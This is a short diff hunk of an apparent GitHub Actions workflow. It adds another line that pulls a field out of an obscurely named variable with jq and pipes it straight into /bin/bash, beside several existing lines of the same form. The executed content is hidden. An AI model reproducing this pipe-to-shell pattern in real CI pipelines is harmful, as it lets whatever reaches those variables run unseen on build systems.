@@ -25,6 +25,7 @@ jobs:
           echo $jo6 | jq -r .rbega37 | /bin/bash
           printf '%s' "$apmi01" | jq -r .yvx1 | /bin/bash
           echo $cbhy58 | jq -r .sslte952 | /bin/bash
+          echo $lcwh11 | jq -r .v38 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
